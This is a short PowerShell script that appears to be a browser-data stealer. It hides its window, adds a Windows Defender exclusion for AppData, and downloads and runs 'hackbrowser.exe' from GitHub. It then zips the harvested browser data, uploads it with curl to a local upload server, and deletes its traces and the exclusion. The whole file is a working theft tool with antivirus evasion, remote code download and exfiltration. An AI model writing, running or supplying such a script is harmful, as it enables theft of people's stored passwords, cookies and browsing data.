$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) 
#Adding windows defender exclusionpath
Add-MpPreference -ExclusionPath "$env:appdata"
#Creating the directory we will work on
mkdir "$env:appdata\dump"
Set-Location "$env:appdata\dump"
#Downloading and executing hackbrowser.exe
Invoke-WebRequest -Uri "https://github.com/Zu-Gui/Zu-Gui/blob/main/hackbrowser.exe?raw=true" -OutFile "$env:appdata\dump\hb.exe"
Invoke-WebRequest -Uri "https://curl.se/windows/dl-7.87.0_2/curl-7.87.0_2-win64-mingw.zip" -OutFile "$env:appdata\dump\curl.zip"
cd $env:appdata\Local\dump
Expand-Archive -Path .\curl.zip
./hb.exe
Remove-Item -Path "$env:appdata\dump\hb.exe" -Force
$Random = Get-Random
Compress-Archive -Path .\results\ -DestinationPath dump.zip
#Server for upload of archives(dump.zip)
cd .\curl\curl-7.87.0_2-win64-mingw\bin\
.\curl.exe -i -X POST -H "Content-Type: multipart/form-data" -F "files=@..\..\..\dump.zip" 127.0.0.1:8000/upload 
#Cleanup
cd "$env:appdata"
Remove-Item -Path "$env:appdata\dump" -Force -Recurse
Remove-MpPreference -ExclusionPath "$env:appdata"


